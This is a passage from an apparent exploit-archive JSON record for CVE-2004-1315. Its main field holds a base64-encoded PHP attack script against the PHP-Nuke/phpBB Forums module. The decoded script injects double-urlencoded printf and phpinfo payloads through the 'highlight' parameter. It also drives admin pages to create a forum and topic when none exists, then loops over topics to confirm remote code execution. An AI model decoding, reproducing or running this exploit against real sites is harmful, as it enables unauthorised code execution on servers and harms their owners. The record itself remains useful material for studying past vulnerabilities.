0kaHR0cC0+c2VuZCgkYXR0YWNrX3VybC4iL21vZHVsZXMucGhwP25hbWU9Rm9ydW1zJmZpbGU9dmlld3RvcGljJnQ9MSZoaWdobGlnaHQ9JTI1MjcucHJpbnRmJTI1MjgyMDA0MTMxNSUyNTI5LiUyNTI3Iik7DQogICAgICAgIC8vaWYgdGhlIGV4cGxvaXQgZGlkbid0IHdvcmssICB0aGVuIHdlIG1pZ2h0IGhhdmUgdG8gZW5hYmxlIHBocGJiIGFuZCBwb3B1bGF0ZSBpdC4NCiAgICAgICAgaWYoIXN0cnN0cigkdHJ5X2V4cGxvaXQsIjIwMDQxMzE1Iikpew0KICAgICAgICAgICAgLy9FbmFsYmUgUEhQQkINCiAgICAgICAgICAgICRodHRwLT5zZW5kKCRhdHRhY2tfdXJsLiIvYWRtaW4ucGhwP29wPW1vZHVsZV9zdGF0dXMmbWlkPTIyJmFjdGl2ZT0xIik7DQogICAgICAgICAgICAvL2NyZWF0ZSBhIG5ldyBjYXRlZ29yeSBmb3IgcGhwYmINCiAgICAgICAgICAgICRodHRwLT5wb3N0ZGF0YT0ibW9kZT1hZGRjYXQmY2F0ZWdvcnluYW1lPXRlc3QmYWRkY2F0ZWdvcnk9Q3JlYXRlK25ldytjYXRlZ29yeSI7DQogICAgICAgICAgICAkdD0kaHR0cC0+c2VuZCgkYXR0YWNrX3VybC4iL21vZHVsZXMvRm9ydW1zL2FkbWluL2FkbWluX2ZvcnVtcy5waHAiKTsNCiAgICAgICAgICAgIC8vaXBiYW4ucGhwDQogICAgICAgICAgICBzbGVlcCgyKTsNCiAgICAgICAgICAgIC8vY3JlYXRlIGEgbmV3IGZvcm0gaW4gdGhlIG5ldyBjYXRlZ29yeQ0KICAgICAgICAgICAgJGh0dHAtPnBvc3RkYXRhPSJmb3J1bW5hbWUlNUIxJTVEPXQmYWRkZm9ydW0lNUIxJTVEPUNyZWF0ZStuZXcrZm9ydW0mY2F0ZWdvcnluYW1lPXRlc3QiOw0KICAgICAgICAgICAgJHQ9JGh0dHAtPnNlbmQoJGF0dGFja191cmwuIi9tb2R1bGVzL0ZvcnVtcy9hZG1pbi9hZG1pbl9mb3J1bXMucGhwPyIpOw0KICAgICAgICAgICAgJGh0dHAtPnBvc3RkYXRhPSJmb3J1bW5hbWU9dCZmb3J1bWRlc2M9dCZjPTEmZm9ydW1zdGF0dXM9MCZwcnVuZV9kYXlzPTcmcHJ1bmVfZnJlcT0xJm1vZGU9Y3JlYXRlZm9ydW0mZj0mc3VibWl0PUNyZWF0ZStuZXcrZm9ydW0iOw0KICAgICAgICAgICAgJGh0dHAtPnNlbmQoJGF0dGFja191cmwuIi9tb2R1bGVzL0ZvcnVtcy9hZG1pbi9hZG1pbl9mb3J1bXMucGhwPyIpOw0KICAgICAgICAgICAgLy9jcmVhdGUgYSBuZXcgdG9waWMgaW4gdGhlIG5ldyBmb3JtDQogICAgICAgICAgICAkaHR0cC0+cG9zdGRhdGE9InVzZXJuYW1lPXQmc3ViamVjdD10JmFkZGJiY29kZTE4PSUyMzQ0NDQ0NCZhZGRiYmNvZGUyMD0xMiZoZWxwYm94PUluc2VydCtVUkwlM0ErJTVCdXJsJTVEaHR0cCUzQSUyRiUyRnVybCU1QiUyRnVybCU1RCtvcislNUJ1cmwlM0RodHRwJTNBJTJGJTJGdXJsJTVEVVJMK3RleHQlNUIlMkZ1cmwlNUQrKyUyOGFsdCUyQnclMjkmbWVzc2FnZT10ZXN0Jm1vZGU9bmV3dG9waWMmZj0xJnBvc3Q9U3VibWl0IjsNCiAgICAgICAgICAgICRodHRwLT5zZW5kKCRhdHRhY2tfdXJsLiIvbW9kdWxlcy5waHA/bmFtZT1Gb3J1bXMmZmlsZT1wb3N0aW5nIik7DQogICAgICAgICAgICAvL2lwYmFuLnBocA0KICAgICAgICAgICAgc2xlZXAoMik7DQogICAgICAgICAgICAvL2FjY2VzcyB0aGUgZmlyc3QgdG9waWMuDQogICAgICAgICAgICAkaHR0cC0+cG9zdGRhdGE9IiI7DQogICAgICAgICAgICAvL0NoZWNrIHRvIHNlZSBpZiBhbnkgb2YgdGhlIGZpcnN0IDEwIHRvcGljcyBhcmUgZXhwbG9pdGFibGUuDQogICAgICAgICAgICBmb3IoJHQ9MTskdDwxMCYmIXN0cnN0cigkdHJ5X2V4cGxvaXQsIjIwMDQxMzE1Iik7JHQrKyl7DQogICAgICAgICAgICAgICAgLy9GaXJlIG9mZiBhIGNoZWNrIGZvciBDVkUtMjAwNC0xMzE1Lg0KICAgICAgICAgICAgICAgJHRyeV9leHBsb2l0PSRodHRwLT5zZW5kKCRhdHRhY2tfdXJsLiIvbW9kdWxlcy5waHA/bmFtZT1Gb3J1bXMmZmlsZT12aWV3dG9waWMmdD0iLiR0LiImaGlnaGxpZ2h0PSUyNTI3LnByaW50ZiUyNTI4MjAwNDEzMTUlMjUyOS4lMjUyNyIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIC8vQ2hlY2sgaWYgd2Ugd2hlcmUgYWJsZSB0byBoaXQgQ1ZFLTIwMDQtMTMxNS4NCiAgICAgICAgaWYoc3Ryc3RyKCR0cnlfZXhwbG9pdCwiMjAwNDEzMTUiKSl7DQogICAgICAgICAgICBwcmludCgiUmVtb3RlIENvZGUgZXhlY3V0aW9uIHRlc3RlZCBzdWNjZXNzZnVsbHk6XG4iLiRhdHRhY2tfdXJsLiIvbW9kdWxlcy5waHA/bmFtZT1Gb3J1bXMmZmlsZT12aWV3dG9waWMmdD0iLi0tJHQuIiZoaWdobGlnaHQ9JTI1MjcucGhwaW5mbyUyNTI4JTI1MjkuJTI1MjdcblRoaXMgaXMgYSBEb3VsYmUgdXJsZW5jb2RlKClcbiIpOw0KICAgICAgICB9ZWxzZXsNCiAgICAgICAgICAgIHByaW50KCJSZW1vdGUgY29kZSBleGVjdXRpb24gaGFzIGZhaWxlZCFcbiIpOw0KICAgICAgICB9DQogICAgfQ0KfQ0KbWFpbigpOw0KPz4=", 
    "filename": "platforms/php/webapps/12510.php", 
    "id": "12510", 
    "cves": [
        "CVE-2004-1315"
    ]
}